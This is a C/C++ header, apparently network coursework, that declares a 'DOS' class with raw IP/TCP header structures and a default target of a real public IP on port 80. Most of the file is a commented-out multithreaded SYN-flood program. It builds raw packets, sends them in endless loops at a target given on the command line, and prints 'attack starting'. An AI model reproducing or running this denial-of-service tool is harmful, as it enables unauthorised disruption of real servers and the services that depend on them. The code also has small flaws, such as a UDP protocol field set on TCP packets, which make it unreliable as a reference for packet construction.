#pragma once
#include <stdio.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <time.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")

#define IPVER   4           //IP协议预定
#define MAX_BUFF_LEN 65500  //发送缓冲区最大值

typedef struct ip_hdr    //定义IP首部 
{
	UCHAR h_verlen;            //4位首部长度,4位IP版本号 
	UCHAR tos;                //8位服务类型TOS 
	USHORT total_len;        //16位总长度（字节） 
	USHORT ident;            //16位标识 
	USHORT frag_and_flags;    //3位标志位 
	UCHAR ttl;                //8位生存时间 TTL 
	UCHAR proto;            //8位协议 (TCP, UDP 或其他) 
	USHORT checksum;        //16位IP首部校验和 
	ULONG sourceIP;            //32位源IP地址 
	ULONG destIP;            //32位目的IP地址 
}IP_HEADER;

typedef struct tsd_hdr //定义TCP伪首部 
{
	ULONG saddr;    //源地址
	ULONG daddr;    //目的地址 
	UCHAR mbz;        //没用
	UCHAR ptcl;        //协议类型 
	USHORT tcpl;    //TCP长度 
}PSD_HEADER;

typedef struct tcp_hdr //定义TCP首部 
{
	USHORT th_sport;            //16位源端口 
	USHORT th_dport;            //16位目的端口 
	ULONG th_seq;                //32位序列号 
	ULONG th_ack;                //32位确认号 
	UCHAR th_lenres;            //4位首部长度/6位保留字 
	UCHAR th_flag;                //6位标志位 
	USHORT th_win;                //16位窗口大小 
	USHORT th_sum;                //16位校验和 
	USHORT th_urp;                //16位紧急数据偏移量 
}TCP_HEADER;



class DOS
{
	char m_IP[256] = { 0 };
	int m_Port = 0;
	int m_Thread = 0;

	SOCKET m_Socket = -1;

	IP_HEADER m_IPHeader;
	TCP_HEADER m_TCPHeader;
	PSD_HEADER m_PSDHeader;

	char m_Sendto_Buffer[MAX_BUFF_LEN] = { 0 };  //发送缓冲区
	unsigned short m_check_Buff[MAX_BUFF_LEN] = { 0 }; //检验和缓冲区
	const char m_send_data[256] = "This is my homework of networt,I am happy!" ;
public:
	DOS();
	~DOS();
	BOOL InitDos(const char *IP = "180.97.33.107",int Port = 80,int Thread = 0);
	void Run();
	char *GetSendData() { return m_Sendto_Buffer; }
private:
	void CloseSocket();
	//CheckSum:计算校验和的子函数 
	USHORT checksum(USHORT *buffer, int size);
	void CheckSum();
};

//多线程的
//#if 0
//#include <stdlib.h>
//#include <stdio.h>
//#include <winsock2.h>
//#include <ws2tcpip.h>
//#include <time.h>
//
//#pragma	comment(lib,"ws2_32.lib")
//#define	PacketNum 1024
//
//////////////////////////////////////////////////////////////////
////全局变量
//////////////////////////////////////////////////////////////////
//
//int		MaxThread; //最大线程数量
//int		CurrentThread = 0; //当前活动线成数量
//char		SendBuff[PacketNum][60] = { 0 }; //1024个数据包，每个的长度就是IpHeader+TcpHeader
//SOCKADDR_IN	Sin;
//SOCKET	SendSocket;
//
//typedef struct ip_hdr
//{
//	unsigned char	h_verlen; //4位首部长度,4位IP版本号
//	unsigned char 	tos; //8位服务类型TOS
//	unsigned short 	total_len; //16位总长度（字节）
//	unsigned short 	ident; //16位标识
//	unsigned short 	frag_and_flags; //3位标志位
//	unsigned char 	ttl; //8位生存时间 TTL
//	unsigned char 	proto; //8位协议 (TCP, UDP 或其他)
//	unsigned short 	checksum; //16位IP首部校验和
//	unsigned int 	sourceIP; //32位源IP地址
//	unsigned int 	destIP; //32位目的IP地址
//}IP_HEADER;
//
//typedef struct tcp_hdr //定义TCP首部
//{
//	USHORT 		th_sport; //16位源端口
//	USHORT 		th_dport; //16位目的端口
//	unsigned int	th_seq; //32位序列号
//	unsigned int	th_ack; //32位确认号
//	unsigned char	th_lenres; //4位首部长度/6位保留字
//	unsigned char 	th_flag; //6位标志位
//	USHORT 		th_win; //16位窗口大小
//	USHORT		th_sum; //16位校验和
//	USHORT		th_urp; //16位紧急数据偏移量
//}TCP_HEADER;
//
//typedef struct tsd_hdr //定义TCP伪首部
//{
//	unsigned long	saddr; //源地址
//	unsigned long 	daddr; //目的地址
//	char 		mbz;
//	unsigned char 		ptcl; //协议类型
//	unsigned short 	tcpl; //TCP长度
//}PSD_HEADER;
//
//////////////////////////////////////////////////////////////////
////函数原形
//////////////////////////////////////////////////////////////////
//
//int             setup(char *, char *);	//生成数据包
//DWORD WINAPI    send_packet(LPVOID); //发送数据函数
//USHORT          checksum(USHORT *, int); //计算检验和函数
//void            watchthread(void); //检测当前线程数量
//
//////////////////////////////////////////////////////////////////
////main函数
//////////////////////////////////////////////////////////////////
//
//int	main(int argc, char *argv[])
//{
//	WSADATA	WSAData;
//	DWORD	ThreadID = 1;
//	HANDLE	ThreadHandle = NULL;
//
//	if (argc != 4)
//	{
//		printf("\n%s\t<TargetIP>\t<TargetPort>\t<MaxThread>\n", argv[0]);
//		return -1;
//	}
//
//	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0)
//	{
//		printf("初始化WSAStartu失败\n");
//		return -1;
//	}
//
//	if (atoi(argv[3]) > 0 && atoi(argv[3]) < 150)
//	{
//		MaxThread = atoi(argv[3]);
//	}
//	else
//	{
//		printf("最大线程数量错误，必须大于0且小于150");
//		return -1;
//	}
//
//	//初始化数据包，储存到数组当中。
//	if (setup(argv[1], argv[2]) == 1)
//	{
//		printf("初始化完成\n");
//	}
//	else
//	{
//		printf("初始化失败\n");
//		return -1;
//	}
//
//	printf("攻击开始...\n");
//
//	while (1)
//	{
//		ThreadID = 1;
//
//		for (int Tmp = 0; Tmp < PacketNum; Tmp++)
//		{
//			watchthread();
//			ThreadID++;
//
//			ThreadHandle = CreateThread(NULL, 0, send_packet, (LPVOID)Tmp, 0, &ThreadID);
//
//			if (ThreadHandle != NULL)
//			{
//
//				CurrentThread++;
//				CloseHandle(ThreadHandle);
//			}
//		}
//	}
//	closesocket(SendSocket);
//	WSACleanup();
//	return 1;
//}
//
//////////////////////////////////////////////////////////////////
////名字:setup
////描述:进行初始设置，计算特定ip，特定端口，特定tcp序列号的检验和，生成数据包
////参数:目的ip地址，目的端口
////目的:提高syn数据包发送速度
//////////////////////////////////////////////////////////////////
//
//int setup(char *DestIp, char *DestPort)
//{
//	char         src_ip[20] = { 0 };//源IP
//	USHORT		src_port;//源端口
//	char			dst_ip[20] = { 0 };//目的IP
//	USHORT		dst_port;//目的端口
//	IP_HEADER    IpHeader;
//	TCP_HEADER   TcpHeader;
//	PSD_HEADER   PsdHeader;
//
//	if (strlen(DestIp) >= 16)
//	{
//		printf("目的IP不对\n");
//		return -1;
//	}
//	strcpy(dst_ip, DestIp);
//
//	if (atoi(DestPort) < 0 || atoi(DestPort) > 65535)
//	{
//		printf("目的端口不对\n");
//		return -1;
//	}
//
//	Sin.sin_family = AF_INET;
//	Sin.sin_port = htons(atoi(DestPort));
//	Sin.sin_addr.s_addr = inet_addr(dst_ip);
//
//	srand((unsigned)time(NULL));
//
//	for (int n = 0; n < PacketNum; n++)
//	{
//		//sprintf_s(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
//
//		//填充IP首部
//		IpHeader.h_verlen = (4 << 4 | sizeof(IpHeader) / sizeof(unsigned long));
//		IpHeader.tos = 0;
//		IpHeader.total_len = htons(sizeof(IpHeader) + sizeof(TcpHeader));
//		IpHeader.ident = 1;
//		IpHeader.frag_and_flags = 0x40;
//		IpHeader.ttl = 128;
//		IpHeader.proto = IPPROTO_UDP;
//		//IpHeader.proto = IPPROTO_TCP;
//		IpHeader.checksum = 0;
//		IpHeader.sourceIP = inet_addr("192.168.0.106");
//		IpHeader.destIP = inet_addr(dst_ip);
//
//		//填充TCP首部
//		TcpHeader.th_sport = htons(rand() % 60000 + 1); //源端口号
//		TcpHeader.th_dport = htons(atoi(DestPort));
//		TcpHeader.th_seq = htons(12);
//		TcpHeader.th_ack = 0;
//		TcpHeader.th_lenres = (sizeof(TcpHeader) / 4 << 4 | 0);
//		TcpHeader.th_flag = 2; //0,2,4,8,16,32->FIN,SYN,RST,PSH,ACK,URG
//		TcpHeader.th_win = htons(512);
//		TcpHeader.th_sum = 0;
//		TcpHeader.th_urp = 0;
//
//		PsdHeader.saddr = IpHeader.sourceIP;
//		PsdHeader.daddr = IpHeader.destIP;
//		PsdHeader.mbz = 0;
//		PsdHeader.ptcl = IpHeader.proto;
//		PsdHeader.tcpl = htons(sizeof(TcpHeader));
//
//		//计算TCP校验和
//		memcpy(SendBuff[n], &PsdHeader, sizeof(PsdHeader));
//		memcpy(SendBuff[n] + sizeof(PsdHeader), &TcpHeader, sizeof(TcpHeader));
//		TcpHeader.th_sum = checksum((USHORT *)SendBuff[n], sizeof(PsdHeader) + sizeof(TcpHeader));
//
//		//计算IP检验和
//		memcpy(SendBuff[n], &IpHeader, sizeof(IpHeader));
//		memcpy(SendBuff[n] + sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader));
//		memset(SendBuff[n] + sizeof(IpHeader) + sizeof(TcpHeader), 0, 4);
//		IpHeader.checksum = checksum((USHORT *)SendBuff, sizeof(IpHeader) + sizeof(TcpHeader));
//
//		memcpy(SendBuff[n], &IpHeader, sizeof(IpHeader));
//		memcpy(SendBuff[n] + sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader));
//	}
//
//	BOOL	Flag;
//	int     Timeout;
//
//	SendSocket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
//	if (SendSocket == INVALID_SOCKET)
//	{
//		return 0;
//	}
//
//	//设置自己填充数据包
//	Flag = TRUE;
//	if (setsockopt(SendSocket, IPPROTO_IP, IP_HDRINCL, (char *)&Flag, sizeof(Flag)) == SOCKET_ERROR)
//	{
//		printf("Setsockopt发生错误\n");
//		return 0;
//	}
//	//设置超时时间
//	Timeout = 1000;
//	if (setsockopt(SendSocket, SOL_SOCKET, SO_SNDTIMEO, (char *)&Timeout, sizeof(Timeout)) == SOCKET_ERROR)
//	{
//		return 0;
//	}
//
//	return 1;
//}
//
//////////////////////////////////////////////////////////////////
////名字:send_packet
////描述:向目标主机发送syn数据包
//////////////////////////////////////////////////////////////////
//
//DWORD	WINAPI	send_packet(LPVOID LP)
//{
//	//发送数据包
//	int     Tmp = (int)LP;
//	int		Ret, Count = 0;
//
//	while (TRUE)
//	{
//		Ret = sendto(SendSocket, SendBuff[Tmp], sizeof(IP_HEADER) + sizeof(TCP_HEADER), 0, (struct sockaddr *) &Sin, sizeof(Sin));
//
//		while (Ret != SOCKET_ERROR)
//		{
//			Count++;
//			if (Count == 10240)
//			{
//				printf(".\n");
//				break;
//			}
//			else
//			{
//				Ret = sendto(SendSocket, SendBuff[Tmp], sizeof(IP_HEADER) + sizeof(TCP_HEADER), 0, (struct sockaddr *) &Sin, sizeof(Sin));
//				if (Ret == SOCKET_ERROR)
//				{
//					exit(0);
//				}
//			}
//		}
//		break;
//	}
//	CurrentThread--;
//	return 1;
//}
//
//////////////////////////////////////////////////////////////////////
////函数：WatchThread
////描述：检测当前线程数量，如果大于等于最大线程数量则休眠0.1秒等待其他线程退出
////返回值：无
//////////////////////////////////////////////////////////////////////
//
//void	watchthread()
//{
//	for (; ; )
//	{
//		if (CurrentThread >= MaxThread)
//		{
//			Sleep(100);
//		}
//		else break;
//	}
//}
//
/////////////////////////////////////////////////////////////////
////函数：CheckSum
////描述：计算检验和
////返回：返回检验和
/////////////////////////////////////////////////////////////////
//
//USHORT	checksum(USHORT * buffer, int size)
//{
//	unsigned	long	cksum = 0;
//
//	while (size > 1)
//	{
//		cksum += *buffer++;
//		size -= sizeof(USHORT);
//	}
//	if (size)
//	{
//		cksum += *(UCHAR *)buffer;
//	}
//	cksum = (cksum >> 16) + (cksum & 0xffff);
//	cksum += (cksum >> 16);
//
//	return (USHORT)(~cksum);
//}
//#endif